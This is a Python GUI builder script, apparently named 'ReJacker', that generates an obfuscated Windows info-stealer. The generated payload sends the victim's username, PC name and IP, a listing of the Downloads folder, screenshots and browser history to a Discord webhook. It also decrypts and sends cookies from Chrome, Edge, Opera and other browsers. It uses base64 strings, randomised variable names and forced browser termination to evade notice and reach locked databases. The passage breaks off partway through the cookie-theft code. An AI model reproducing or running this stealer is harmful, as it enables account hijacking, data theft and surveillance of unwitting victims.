import tkinter
import tkinter.filedialog
import tkinter.messagebox
import os
import string
import random
import shutil
import subprocess
import base64

appiconlocation = "src_files\\app_icon.ico"

def appiconpic():
    filename = tkinter.filedialog.askopenfilename(initialdir='/', filetypes=(("İco File", "*.ico"),))
    global appiconlocation
    appiconlocation = filename


def build_virus():
    global webhooktext
    if (webhooktext.get(1.0, "end-1c") == ""):
        tkinter.messagebox.showerror("ReJacker - Erorr", "Add Discord Webhook Link !")
        return
    try:
        os.remove("generated_app.py")
    except:
        pass
    virus_open = open("generated_app.py", "x") 

    webhooklinkconvertedbase64 = base64.b64encode(webhooktext.get(1.0, "end-1c").encode()).decode()
    webhooklink_var_name = ''.join(random.choices(string.ascii_lowercase, k=15))

    variable_str = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=90))
    variable_name = ''.join(random.choices(string.ascii_lowercase, k=15))


    app_source_code_str = f"{variable_name} = \"{variable_str}\" "

    app_source_code_str += f'''
import json
import requests
import base64
from requests_toolbelt.multipart.encoder import MultipartEncoder
{webhooklink_var_name} = base64.b64decode("{webhooklinkconvertedbase64}").decode()

'''

    # Generating virus source code...
    if (systeminfos.get() == 1):
        variable_ip_name = ''.join(random.choices(string.ascii_lowercase, k=18))
        app_source_code_str += f'''

import os
{variable_ip_name} = requests.get('https://api.ipify.org').text

requests.post({webhooklink_var_name}, ''' + ''' json={ 
                "username": base64.b64decode("UmVqYWNrZXI=").decode(),
                "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode(),
                "embeds": [
                    {
                        "color": 16754176,
                        "title": base64.b64decode("U3lzdGVtIMSwbmZvIC0gUmVqYWNrZXI=").decode(),
                        "fields": [
                        {
                            "name": base64.b64decode("U3lzdGVtIMSwbmZvIC0gUmVqYWNrZXI=").decode(),
                            "value": "**PC Username:** " + os.getenv("UserName") + " **PC Name:** " + os.getenv("COMPUTERNAME") + " **IP:** " + ''' + variable_ip_name + '''
                        }
                        ]
                    }
                ]
            })

'''

    if (downloadfiles.get() == 1):
        array_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        filesnames_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        app_source_code_str += f''' 

import os
import base64


{filesnames_var_name} = "PC Username: " + os.getenv("UserName") + " PC Name: " + os.getenv("COMPUTERNAME") + "\\n"

{array_var_name} = os.listdir(base64.b64decode("QzpcVXNlcnNc").decode() + os.getenv("UserName") + base64.b64decode("XERvd25sb2Fkcw==").decode())

for icerik in {array_var_name}:
    {filesnames_var_name} += icerik + "\\n"

encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode()
}), 'file': (f'scxvsdgfgczw.txt',''' + filesnames_var_name + ''', 'application/txt')})
requests.post(''' + webhooklink_var_name +''', headers={'Content-type': encoder.content_type}, data=encoder)


'''


    if (downloadfiles.get() == 1):
        array_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        filesnames_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        app_source_code_str += f''' 

import os
import base64


{filesnames_var_name} = "PC Username: " + os.getenv("UserName") + " PC Name: " + os.getenv("COMPUTERNAME") + "\\n"

{array_var_name} = os.listdir(base64.b64decode("QzpcVXNlcnNc").decode() + os.getenv("UserName") + base64.b64decode("XERvd25sb2Fkcw==").decode())

for icerik in {array_var_name}:
    {filesnames_var_name} += icerik + "\\n"

encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode()
}), 'file': (f'scxvsdgfgczw.txt',''' + filesnames_var_name + ''', 'application/txt')})
requests.post(''' + webhooklink_var_name +''', headers={'Content-type': encoder.content_type}, data=encoder)


'''


    if (single_screenshot.get() == 1):
        screenshot_file_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        app_source_code_str += f''' 

from PIL import ImageGrab
import os
import io
import base64
masdgsdaname = "{screenshot_file_name}"
image = ImageGrab.grab(
        bbox=None,
        all_screens=True,
        include_layered_windows=False,
        xdisplay=None
        )

image_buffer = io.BytesIO()
image.save(image_buffer, format="PNG")
image_data = image_buffer.getvalue()
image_buffer.close()
image.close()

encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
                "username": base64.b64decode("UmVqYWNrZXI=").decode(),
                "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode(),
                "embeds": [
                    {
                        "color": 16754176,
                        "title": base64.b64decode("U2NyZWVuc2hvdCAtIFJlSmFja2Vy").decode(),
                        "image": {
                            "url": "attachment://image.png"
                        }
                    }
                ]
            }), 'file': ('image.png', image_data, 'image/png')})
requests.post(''' + webhooklink_var_name + ''', headers={'Content-type': encoder.content_type}, data=encoder)


'''
    if (get_browser_history.get() == 1):
        history_variable_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        history_sql_command1_variable_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        history_sql_command2_variable_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        app_source_code_str += f'''  
import os
import sqlite3
{history_variable_name} = "PC Username: " + os.getenv("UserName") + " PC Name: " + os.getenv("COMPUTERNAME") + "\\n"

{history_sql_command1_variable_name} = base64.b64decode("U0VMRUNUICogRlJPTSB1cmxz").decode()
{history_sql_command2_variable_name} = base64.b64decode("U0VMRUNUICogRlJPTSB2aXNpdGVkX2xpbmtz").decode()

try:
    os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGJyYXZlLmV4ZQ==").decode())
    os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG9wZXJhLmV4ZQ==").decode())
    os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIHZpdmFsZGkuZXhl").decode())
    os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGNocm9tZS5leGU=").decode())
    os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG1zZWRnZS5leGU=").decode())
except:
    pass

try:
    dirs = os.listdir(os.getenv("APPDATA") + base64.b64decode("XE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1w=").decode())
    for yol in dirs:
        try:
            {history_variable_name} += "\\nFirefox\\n"
            for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1w=").decode() + "\\\\"+ yol + "\\\\places.sqlite").cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBtb3pfcGxhY2Vz").decode()):
                {history_variable_name} += "\\n" + str(row) + "\\n"
        except:
            pass
except:
    pass

    
try:
    {history_variable_name} += "\\nChrome\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nChrome\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nChrome P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMVxIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nChrome P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMVxIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nChrome P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMlxIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nChrome P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMlxIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nChrome P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgM1xIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nChrome P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgM1xIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass


try:
    {history_variable_name} += "\\nEdge\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XEhpc3Rvcnk=").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nEdge\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XEhpc3Rvcnk=").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nEdge P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDFcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nEdge P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDFcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nEdge P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDJcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nEdge P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDJcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nEdge P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDNcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nEdge P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDNcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass


try:
    {history_variable_name} += "\\nOpera\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxEZWZhdWx0XEhpc3Rvcnk=").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nOpera\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxEZWZhdWx0XEhpc3Rvcnk=").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
    
    

try:
    {history_variable_name} += "\\nOpera Gx\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nOpera Gx\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
    


try:
    {history_variable_name} += "\\nBrave\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdFxIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nBrave\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdFxIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass



try:
    {history_variable_name} += "\\nVivaldi\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHRcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nVivaldi\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHRcSGlzdG9yeQ==").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
    
try:
    {history_variable_name} += "\\nVivaldi P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMVxIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nVivaldi P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMVxIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nVivaldi P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMlxIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nVivaldi P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMlxIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass

try:
    {history_variable_name} += "\\nVivaldi P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgM1xIaXN0b3J5").decode()).cursor().execute({history_sql_command1_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass
try:
    {history_variable_name} += "\\nVivaldi P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgM1xIaXN0b3J5").decode()).cursor().execute({history_sql_command2_variable_name}):
        {history_variable_name} += "\\n" + str(row) + "\\n"
except:
    pass



encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode()
}), 'file': (f'scxvsdgfgczw.txt',''' + history_variable_name + ''', 'application/txt')})
requests.post(''' + webhooklink_var_name +''', headers={'Content-type': encoder.content_type}, data=encoder)
'''

    if (get_browser_cookies.get() == 1):
        encrypted_key_get_fuction_name_var = ''.join(random.choices(string.ascii_lowercase, k=10))
        encrypted_use_decrypt_data_fuction_name_var = ''.join(random.choices(string.ascii_lowercase, k=10))

        cookies_variable_name = ''.join(random.choices(string.ascii_lowercase, k=10))

        chrome_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        opera_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        operagx_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        edge_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        brave_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        vivaldi_deckey_var_name = ''.join(random.choices(string.ascii_lowercase, k=10))
        app_source_code_str += f'''  
import os
import sqlite3
import os
import sqlite3
import base64
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import json

def {encrypted_key_get_fuction_name_var}(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    lcoalstate = json.loads(c)
    keyprosds = base64.b64decode(lcoalstate["os_crypt"]["encrypted_key"])
    keyprosds = keyprosds[5:]
    keyprosds = CryptUnprotectData(keyprosds, None, None, None, 0)[1]
    return keyprosds


def {encrypted_use_decrypt_data_fuction_name_var}(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    cozulmusveri = cipher.decrypt(payload)
    cozulmusveri = cozulmusveri[:-16].decode()
    return cozulmusveri

{cookies_variable_name} = "**PC Username:** " + os.getenv("UserName") + " **PC Name:** " + os.getenv("COMPUTERNAME") + "\\n"

os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGJyYXZlLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG9wZXJhLmV4ZQ==").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIHZpdmFsZGkuZXhl").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIGNocm9tZS5leGU=").decode())
os.system(base64.b64decode("dGFza2tpbGwgL2YgL2ltIG1zZWRnZS5leGU=").decode())



try:
    {chrome_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass
try:
    {cookies_variable_name} += "\\nChrome\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass

try:
    {cookies_variable_name} += "\\nChrome P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMVxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass

try:
    {cookies_variable_name} += "\\nChrome P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMlxOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass

try:
    {cookies_variable_name} += "\\nChrome P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgM1xOZXR3b3JrXENvb2tpZXM=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {chrome_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass


try:
    {edge_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass
try:
    {cookies_variable_name} += "\\nEdge\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XE5ldHdvcmtcQ29va2llcw==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\\n"
except:
    pass

try:
    {cookies_variable_name} += "\\nEdge P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDFcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\\n"
except:
    pass

try:
    {cookies_variable_name} += "\\nEdge P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDJcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\\n"
except:
    pass

try:
    {cookies_variable_name} += "\\nEdge P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDNcTmV0d29ya1xDb29raWVz").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + " , " + str(row[18]) + " , " + str(row[19]) + "\\n"
except:
    pass


try:
    {opera_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    {cookies_variable_name} += "\\nOpera\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxEZWZhdWx0XE5ldHdvcmtcQ29va2llcw==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBjb29raWVz").decode()):
        {cookies_variable_name} += "\\n" + str(row[0]) + str(row[1]) + " , " + str(row[3]) + " , " + str(row[4]) + " , " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {opera_deckey_var_name}) + " , " + str(row[6]) + " , " + str(row[7]) + " , " + str(row[8]) + " , " + str(row[9]) + " , " + str(row[10]) + " , " + str(row[11]) + " , " + str(row[12]) + " , " + str(row[13]) + " , " + str(row[14]) + " , " + str(row[15]) + " , " + str(row[16]) + " , " + str(row[17]) + "\\n"
except:
    pass


try:
